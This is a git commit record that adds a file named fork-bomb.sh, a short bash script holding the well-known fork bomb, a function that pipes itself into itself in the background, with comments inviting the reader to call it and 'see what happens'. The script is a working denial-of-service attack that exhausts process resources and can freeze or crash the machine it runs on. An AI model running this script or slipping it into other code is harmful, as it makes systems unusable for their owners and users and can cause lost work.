20b485fa2261b96b237e3dbdbd833b915d1fa73b
0xleyth <16468186+0xleyth@users.noreply.github.com>
2024-07-05 23:46:34 -0700

    first commit

---
+++ fork-bomb.sh
@@ -0,0 +1,9 @@
+!#/bin/bash
+
+# define a function called () which calls itself
+# pipes itself to itself and put itself int he background
+:(){ :|: & };
+
+# call function and see what happens :)  
+:
+
